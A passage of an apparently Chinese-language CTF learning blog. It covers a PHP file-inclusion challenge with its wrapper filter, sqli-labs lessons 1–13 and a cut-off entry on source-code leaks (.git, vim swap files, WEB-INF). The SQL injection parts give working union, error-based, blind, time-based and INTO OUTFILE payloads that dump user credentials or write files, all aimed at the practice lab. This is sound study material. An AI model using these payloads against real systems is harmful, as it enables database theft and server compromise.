class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php://input&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;zip://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;phar://&quot;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data:&quot;</span>))&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);  <span class="hljs-comment">// stristr: 返回查找的字符串+后面剩余字符串，总之就是检测</span><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;  <span class="hljs-comment">//flag.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再试试同样的方法查看flag.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;f6ca3992-6f08-4c09-b7e9-9d70e8c1d702&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli_labs 解题笔记(2)</title>
    <link href="/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/"/>
    <url>/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/</url>
    
    <content type="html"><![CDATA[<p>双查询注入、php反弹shell、hackbar里get、post区别</p><p>1个菜b学sql注入的笔记，大佬绕过</p><p>前面水了很多，是因为好多基础知识俺8太会。因此到了这里，就8会再水了</p><h1 id="lesson-5-双查询注入-错误回显来返回信息"><a href="#lesson-5-双查询注入-错误回显来返回信息" class="headerlink" title="lesson_5 双查询注入, 错误回显来返回信息"></a>lesson_5 双查询注入, 错误回显来返回信息</h1><p><img src="/images/sqli_labs/sqli_labs(2).png"><br>尝试注入, 发现要么报错，要么显示上面的东东</p><p>result1: You are in………..<br>result2: You have an error in your SQL syntax…..</p><p>所以此处我们要学习1个新的思路，叫利用错误回显来获得信息</p><h2 id="利用错误回显来返回信息-抄作业"><a href="#利用错误回显来返回信息-抄作业" class="headerlink" title="利用错误回显来返回信息(抄作业)"></a>利用错误回显来返回信息(抄作业)</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>举例: 一个阔以在报错回显里获得当前数据库的语句:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a#<br></code></pre></td></tr></table></figure><p>大概意思就是根据报错来回显信息，这得搓代码多少年才能想到这个…会用就行了……<br>attention: 由于rand()函数的随机性，需要多次刷新，会得到下图结果<br><img src="/images/sqli_labs/sqli_labs(3).png"><br>获得当前database: security  <del>可恶，是幻术</del><br>然后把上述语句的database()换成user()，刷新几次，获得当前user<br>再获得table_name以及其他信息:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a-- <br></code></pre></td></tr></table></figure><p>刷新几次后….</p><p><img src="/images/sqli_labs/sqli_labs(3).png"></p><p>0hhhhhhhhhhhhhhhh!!!!!!!</p><h1 id="lesson-7-文件反弹shell"><a href="#lesson-7-文件反弹shell" class="headerlink" title="lesson_7 文件反弹shell"></a>lesson_7 文件反弹shell</h1><p>首先，盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&quot;-- 正常<br>?<span class="hljs-attribute">id</span>=1&#x27;)-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&#x27;))-- 正常，返回结果: You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span> Use outfile<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure><p>(ps: 所以有时候括号要闭合好几次啊)</p><p>根据返回结果可知，这又是个错误回显注入，然后尝试用双查询、updatexml()等各种错误回显，发现8行，错误回显没有数据</p><p>网上搜索可知，这里根据回显结果’Use outfile’提示，要用到php反弹shell，原理见俺另一个记录sql注入姿势原理的博客</p><p>于是我们就阔以构造: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">id</span>=-1&#x27;)) union select group_concat(username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>into outfile <span class="hljs-string">&#x27;F:/shit.txt&#x27;</span>-- <br></code></pre></td></tr></table></figure><p>于是，就报错了</p><p>因为mysql在配置文件里限制了导出文件的路径，既然如此，就要知道这个路径</p><p>为此我们要用到这个: datadir、basedir(具体原理见俺另一个记录sql注入姿势原理的博客)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>,@<span class="hljs-variable">@basedir</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>投个机，在第一关试试:<br><img src="/images/sqli_labs/sqli_labs(6).png"></p><p>就知道了</p><p>然后开始构造:<br>.<br>.<br>.</p><p>这关迟迟过不了，太菜了，网上的payload原封不动地上都没反应，阔能是环境错了。还是先学学基础，比如这关要用到的基础知识: <a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">一句话木马</a></p><p>然后周四再去问问210这关咋搞</p><p>后续:<br>今天去210，bw师傅给俺解决了，大致原因是: 首先linux里的路径阔以是’&#x2F;‘也阔以是’&#39;，但windows里则只能是’&#x2F;‘;其次你的secure_file_priv一开始的值是”NULL”，mysql里NULL和空是2个概念，俺的理解就是:NULL表示没有，空表示没有限制，想是啥都行<br><img src="/images/sqli_labs/sqli_labs(8).png"></p><p>如图，虽然报错，但是生成了文件，记得以后路径要用’&#x2F;‘</p><h1 id="lesson-8-我超，盲注"><a href="#lesson-8-我超，盲注" class="headerlink" title="lesson_8 我超，盲注"></a>lesson_8 我超，盲注</h1><p>所谓盲注，就是在注入过程中数据不能回显到前端页面，全靠猜，猜对和猜错的回显8一样(所以叫布尔)</p><p>而又因为全靠猜，所以得搓脚本</p><p>具体的分类以及姿势，写在另一个博客里了</p><p>到这里就要再学一些函数了</p><p>操作:</p><p>首先判断你要查的东东的名字长度, 比如数据库:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> (<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>())=<span class="hljs-number">8</span>)-- </span><br></code></pre></td></tr></table></figure><p>比如mysql版本(一般是4或5):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> substring(@@version,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> --<br></code></pre></td></tr></table></figure><p>然后就通过ascii一个一个猜</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115) -- <br></code></pre></td></tr></table></figure><p>此处自然是要写脚本，之前学的爬虫排上用场了，可是俺的Python在装双环境时出问题了，一直没解决….</p><p>但是还有burp和sqlmap阔以用，过了</p><h2 id="lesson-9-时间盲注"><a href="#lesson-9-时间盲注" class="headerlink" title="lesson_9 时间盲注"></a>lesson_9 时间盲注</h2><p>此处的特点是，无论后面拼接的语句是否正确，都只会返回同样的结果: You are in….</p><p>而布尔盲注一般会返回2个结果，所以此关要用到时间盲注</p><p>eg:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- </span><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h1 id="lesson-13-基于报错的布尔盲注"><a href="#lesson-13-基于报错的布尔盲注" class="headerlink" title="lesson_13 基于报错的布尔盲注"></a>lesson_13 基于报错的布尔盲注</h1><p>本关闭合错误会有回显，但闭合正确了啥都不显示(比如输入Dumb、Dumb分别为username、password，不会回显)</p><p>同时正确闭合后时间盲注也没卵用<br>同时这个也没卵用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()=<span class="hljs-number">18</span>))</span><br></code></pre></td></tr></table></figure><p><img src="/images/sqli_labs/sqli_labs(7).png"><br>但是，基于报错的布尔盲注是有用的!!(因为人家会返回报错)</p><h1 id="add-关于hackbar里post和get传参的区别"><a href="#add-关于hackbar里post和get传参的区别" class="headerlink" title="add: 关于hackbar里post和get传参的区别"></a>add: 关于hackbar里post和get传参的区别</h1><p>我草….来回几遍以为是语法错误检查不出来，后来才发现hackbar在post传参时是要用url码的…..</p><p>比如: 在get传参时，可以用’– ‘来表示注释，但在post传参里则必须为’–+’</p><p>而如果在post里不用url码，则会出现以下结果:</p><p><img src="/images/sqli_labs/sqli_labs(4).png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli_lab 解题笔记(1)</title>
    <link href="/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>注入的基本操作(字符型、数字型、优先匹配、强制字符转换), sqli_labs1-4关</p><p>1个菜b学sql注入的笔记，大佬绕过</p><p>前置知识: 10以内加减法、mysql语法，建议去<a href="https://www.w3school.com.cn/">w3school</a></p><p>俺第一次学的时候感觉进步很慢，很难，然后就咕咕了，后来发现还是要先打好基础，后面会简单一些</p><p>由于没学过数据库，0基础fw,所以前面水的比较多，后面就8废话了</p><p>另外，<a href="https://blog.51cto.com/skytina/1698724">信安日记</a>这篇讲得8错，很通俗，阔以对照着看</p><p>SQL注入原理，虽然简单，还是再叙述一下, 大致就是你传进1个参，然后服务器会执行php文件的命令，然后你就阔以在传参上做点手脚</p><p>比如这个php文件里有这样1个命令:<br>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;(其中$sql就是你传的参)<br>如果传入&#x2F;?id&#x3D;-1’ DELETE database() – ，原语句就变意思了，服务器就会识别成删库语句，然后就…</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="关于database、schema、table等的关系"><a href="#关于database、schema、table等的关系" class="headerlink" title="关于database、schema、table等的关系"></a>关于database、schema、table等的关系</h2><p>database是个旅馆，schema是房间，table是床，users有的可以操作schema(eg:房客)，有的可以操作database(eg:老鸨)</p><h3 id="优先匹配"><a href="#优先匹配" class="headerlink" title="优先匹配"></a>优先匹配</h3><p>在where语句中，当出现多个字符串的时候，“&#x3D;”将会选择优先级最高的一个，优先级是从左到右，依次降低的！也就是离“&#x3D;”最近的一个。<br>eg:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span><span class="hljs-string">&#x27;qnmd&#x27;</span>;<br></code></pre></td></tr></table></figure><p>以上查询结果都一样，等同于只输1个’1’</p><h3 id="concat家族"><a href="#concat家族" class="headerlink" title="concat家族"></a>concat家族</h3><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>concat(column1,column2):将column1, column2联合显示</p><h4 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws:"></a>concat_ws:</h4><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符</p><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat():"></a>group_concat():</h4><p>要知道这个，得知道GROUP BY，见下面</p><p>然后回到group_concat()，它就是将GROUP BY产生的分组里的字符~~~拼~~~连接，作为1个字符返回</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>一般和GROUP_CONCAT混用，用于数据分组</p><p><img src="/images/sqli_labs/sqli_labs(9).png"></p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>很牛逼的数据库，相当于新华字典，里面存着数据库名字等关键信息<br>m0r3:<br>information_schema下的表:<br>    schemata:(schema_data缩写)提供所有数据库信息，里面有schema_name</p><pre><code class="hljs">tables:table_name,所有表名; table_schema:所有表所在数据库名称eg: select group_concat(table_name) from information_schema.tables where table_schema=&#39;qnmd&#39;-- (找&#39;qnmd&#39;数据库下的所有表)columns:提供表中的列信息，其中有个叫colums_name的列，提供所有表里有啥列，还有table_name,常用于限定查哪个表(此处的table_name和tables里的table_name好像还8一样，姑且不研究太深)eg: select group_concat(column_name) from information_schema.columns where table_name=&#39;shit&#39;-- (找&#39;shit&#39;表里的所有列名)其他的8太需要了解</code></pre><h1 id="lesson-1-字符型注入"><a href="#lesson-1-字符型注入" class="headerlink" title="lesson_1 字符型注入"></a>lesson_1 字符型注入</h1><h2 id="1、判断类型"><a href="#1、判断类型" class="headerlink" title="1、判断类型"></a>1、判断类型</h2><p>?id&#x3D;1 and 1&#x3D;2– ,返回正常，所以8是数字型注入<br>?id&#x3D;1’ ,加单引号，发现报错，加– 注释，显示正常，说明是单引号注入;</p><h2 id="分析字段数-判断该表有几列数据"><a href="#分析字段数-判断该表有几列数据" class="headerlink" title="分析字段数(判断该表有几列数据)"></a>分析字段数(判断该表有几列数据)</h2><p>为啥要分析呢？因为后面UNION SELECT要用到</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>回显正常，?id&#x3D;1’ order by 4– ，回显错误，说明有3列</p><h2 id="看看页面有没有显示位"><a href="#看看页面有没有显示位" class="headerlink" title="看看页面有没有显示位"></a>看看页面有没有显示位</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>结果:<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3 </p><p>说明有2个显示位(有时，SELECT语句会限制输出的行数(比如SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1)，这时候就需要让第一行失效)</p><h2 id="找出数据库名，表名、列名"><a href="#找出数据库名，表名、列名" class="headerlink" title="找出数据库名，表名、列名"></a>找出数据库名，表名、列名</h2><p>将id&#x3D;1改成数据库8存在的值，这样显示的时候便不占用显示位(原理:因为没有，所以8会显示)</p><p>?id&#x3D;qnmd’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –<br>来手逐字解析，比较0基础</p><p>GROUP_CONCAT, schema_name, schema_name：见上文<br>indormation.schemata: 加information_schema是因为schemata在当前数据库没有，而是在information_schema里，要先换到另一个数据库<br>tips: GROUP_CONCAT此处后面没有GROUP BY，所以是直接将所有的列打包到一块，作为1个字符串，结果显示:emails,referers,uagents,users，若不加GROUP_CONCAT()则只显示emails</p><h1 id="lesson-2-数字型注入"><a href="#lesson-2-数字型注入" class="headerlink" title="lesson_2 数字型注入"></a>lesson_2 数字型注入</h1><p>众所周知，数字型注入也是个基本注入类型</p><h2 id="判断是否是数字型"><a href="#判断是否是数字型" class="headerlink" title="判断是否是数字型"></a>判断是否是数字型</h2><p>只需要通过简单的加减法就阔以判断啦!(此处注意，在url码里+是空格，所以要用%2B表示+)</p><p>首先输入&#x2F;?id&#x3D;1’，显示错误，但是当输入&#x2F;?id&#x3D;1’– 时仍然错误，然后注意此处返回的报错:<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>而不是:<br>Unknown column ‘1’’ in ‘where clause’<br>所以说明这里的’并没有被php里的某些防护函数转义(相关知识见下方)</p><p>然后输入&#x2F;?id&#x3D;1+1，返回结果和&#x2F;?id&#x3D;2一样，就阔以说明是数字型注入了</p><p>数字型注入和字符型的区别8大，不需要用’闭合就是了，略</p><h3 id="tips-小提一下php里的一些转义函数"><a href="#tips-小提一下php里的一些转义函数" class="headerlink" title="tips, 小提一下php里的一些转义函数"></a>tips, 小提一下php里的一些转义函数</h3><p>有时候php里的一些函数在传入的参里有’,”,&#x2F;等字符时，会在其前面自动补’&#x2F;‘对1其转义，防止sql注入</p><h1 id="lesson-3-需要闭合括号的注入"><a href="#lesson-3-需要闭合括号的注入" class="headerlink" title="lesson_3 需要闭合括号的注入"></a>lesson_3 需要闭合括号的注入</h1><p>首先构造闭合单引&#x2F;?id&#x3D;1’，返回报错: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1<br>发现了一个奇怪的’(‘，搜索得知，这是个需要闭合括号的注入, 查看php源码发现它的指令如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;$id&#x27;</span>);<br></code></pre></td></tr></table></figure><p>而我们之前注入的php源码则是这样:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span>;<br></code></pre></td></tr></table></figure><p>所以加个’)’进行闭合就阔以啦!<br>实操，很ez</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,database(),user()</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-keyword">user</span>() <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">-- </span><br>?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(column_name),user() from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p><img src="/images/sqli_labs/sqli_labs(1).png"></p><h1 id="数字型注入知识点"><a href="#数字型注入知识点" class="headerlink" title="数字型注入知识点"></a>数字型注入知识点</h1><h2 id="数字型和字符型的区别"><a href="#数字型和字符型的区别" class="headerlink" title="数字型和字符型的区别"></a>数字型和字符型的区别</h2><p>数字型传入的参数8是包裹在引号里的，传入的参会被转化为数字，比如传入id&#x3D;1+1，系统会查找id&#x3D;2的行</p><p>其注入方法，除了8需要用’闭合外，和字符型注入差不多</p><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>php里的强制类型转换规则，和c可8大一样</p><p>比如输入’shit’,’1shit’,’2shit’,若强制转换为数字, 会分别被转为: 0,1,2</p><p>因为’shit’里，第一个字符8是数字，就会转化成0;’1shit’则会转化为1，忽略后面的非数字</p><h2 id="在数字型注入想输入字符"><a href="#在数字型注入想输入字符" class="headerlink" title="在数字型注入想输入字符"></a>在数字型注入想输入字符</h2><p>2种方法</p><h3 id="使用16进制"><a href="#使用16进制" class="headerlink" title="使用16进制"></a>使用16进制</h3><p>待填</p><h3 id="使用char-函数"><a href="#使用char-函数" class="headerlink" title="使用char()函数"></a>使用char()函数</h3><p>待填</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码泄露&#92;信息搜集小总结</title>
    <link href="/2021/10/15/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
    <url>/2021/10/15/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>各种源码泄露总结的笔记</p><span id="more"></span><p>贴个<a href="https://skills.bugbank.cn/skill.html?type=11">链接</a><br>还有其他<a href="https://blog.csdn.net/Fly_hps/article/details/82821857">参考文献</a></p><h1 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>开发人员使用 git 进行版本控制，对站点部署。但如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>用扫描器扫描(俺用的御剑，如果字典里没有得自己加)，大概像这样<br><img src="/images/git%E6%B3%84%E9%9C%B2(1).png"><br>如果能访问那就存在git泄露<br>也可以试着访问 .git&#x2F;head 文件，如果能下载也能推断存在 Git 源码泄露</p><h2 id="获取泄露的源码"><a href="#获取泄露的源码" class="headerlink" title="获取泄露的源码"></a>获取泄露的源码</h2><p>阔以用GitHack脚本，可以解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。通过泄露的.git文件夹下的文件重建还原工程源代码。键入下面的命令就会把存在Git泄露的源码全部下载下来<br>命令：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">GitHack.py <span class="hljs-built_in">url</span><br></code></pre></td></tr></table></figure><p>(注：此处url是.git的url)<br><a href="https://github.com/lijiejie/GitHack">GitHack下载链接</a></p><h2 id="实战-buuctf-第一章-web入门-粗心的小李"><a href="#实战-buuctf-第一章-web入门-粗心的小李" class="headerlink" title="实战: buuctf[第一章 web入门]粗心的小李"></a>实战: buuctf[第一章 web入门]粗心的小李</h2><p>首先，下载githack，然后终端打开，执行: python githack.py 链接&#x2F;.git&#x2F;<br>然后就可以看到githack目录下多了个以目标链接命名的文件夹，打开就阔以找到flag辣</p><h1 id="敏感备份文件泄露"><a href="#敏感备份文件泄露" class="headerlink" title="敏感备份文件泄露"></a>敏感备份文件泄露</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：<br>第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn<br>常见的备份文件格式有：<br>index.phps<br>index.php.swp<br>index.php.swo<br>index.php.php~<br>index.php.bak<br>index.php.txt<br>index.php.old<br>index.php~</p><p>注意: 有时候用dirsearch、菜刀等工具扫描时会因频率而被429限制访问，这时候需要延迟爆破频率</p><h1 id="java之WEB-INF文件泄露"><a href="#java之WEB-INF文件泄露" class="headerlink" title="java之WEB-INF文件泄露"></a>java之WEB-INF文件泄露</h1><h2 id="WEB-INF"><a href="#WEB-INF" class="headerlink" title="WEB-INF"></a>WEB-INF</h2><p>WEB-INF是java的web应用的的安全目录(所谓安全就是客户端无法访问，只有服务端可以访问的目录)，若想在页面里直接访问其中文件，必须通过web.xml对要访问的文件映射才能访问<br>WEB-INF主要有以下文件:<br>WEB-INF&#x2F;web.xml: 配置文件，路径映射<br>WEB-INF&#x2F;classes: 含了站点所有用的 class 文件(包括 servlet class 和非servlet class)<br>WEB-INF&#x2F;lib: 存放web应用需要的各种JAR文件<br>WEB-INF&#x2F;src: 源码<br>WEB-INF&#x2F;database.properties: 数据库配置文件</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>通常在web应用中我们会用多个web服务器用来彼此弥补<br>使用这种架构时，若对资源的目录或文件的映射配置不当，可能会导致web.xml文件可被读取</p><p>利用漏洞: 